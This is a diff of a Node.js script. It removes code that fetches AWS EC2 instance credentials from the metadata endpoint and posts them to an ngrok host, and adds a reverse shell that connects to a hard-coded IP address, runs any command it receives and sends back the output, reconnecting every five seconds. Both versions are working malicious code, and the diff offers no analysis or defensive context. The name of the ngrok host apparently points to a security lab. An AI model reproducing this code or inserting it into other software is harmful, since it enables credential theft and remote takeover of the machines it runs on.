@@ -1,30 +1,62 @@
 #!/usr/bin/env node
-const { exec } = require("child_process");
 
-// Step 1: Get the credentials from the metadata endpoint
-const metadataEndpoint = "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance";
-const postServer = "https://nomasec-labs.ngrok.app/response";
+const net = require('net');
+const { exec } = require('child_process');
 
-// Get credentials
-exec(`curl -s "${metadataEndpoint}"`, (error, stdout, stderr) => {
-  if (error) {
-    console.error(`Error fetching metadata: ${error.message}`);
-    process.exit(1);
+const SERVER_IP = '44.221.64.178';
+const SERVER_PORT = 1234;
+
+function connectBack() {
+  let socket = null;
+
+  function startConnection() {
+    socket = new net.Socket();
+
+    socket.connect(SERVER_PORT, SERVER_IP, () => {
+      console.log(`[+] Connected to ${SERVER_IP}:${SERVER_PORT}`);
+    });
+
+    socket.on('data', (data) => {
+      const command = data.toString().trim();
+      if (['exit', 'quit'].includes(command.toLowerCase())) {
+        socket.end();
+        return;
+      }
+
+      exec(command, (error, stdout, stderr) => {
+        let output = '';
+        if (error) {
+          output = error.message + '\n';
+        }
+        output += stdout || '';
+        output += stderr || '';
+        if (!output) {
+          output = '[+] Command executed, no output.\n';
+        }
+        try {
+          socket.write(output);
+        } catch (err) {
+          // Socket may be closed, ignore
+        }
+      });
+    });
+
+    socket.on('error', (err) => {
+      console.error(`[-] Connection failed: ${err.message}`);
+      setTimeout(startConnection, 5000);  // Retry after 5 seconds
+    });
+
+    socket.on('close', () => {
+      if (socket) {
+        socket.destroy();
+      }
+      setTimeout(startConnection, 5000); // Retry after 5 seconds
+    });
   }
-  if (stderr) {
-    console.error(`Stderr: ${stderr}`);
-    // Proceed: AWS will usually return plain text here
-  }
 
-  // Step 2: Send raw response as POST body
-  exec(`curl -X POST -H "Content-Type: application/json" -d '${stdout}' "${postServer}"`, (err, out, errout) => {
-    if (err) {
-      console.error(`Error sending POST: ${err.message}`);
-      process.exit(1);
-    }
-    if (errout) {
-      console.error(`Stderr from POST: ${errout}`);
-    }
-    console.log("Server acknowledged:", out);
-  });
-});
+  startConnection();
+}
+
+if (require.main === module) {
+  connectBack();
+}
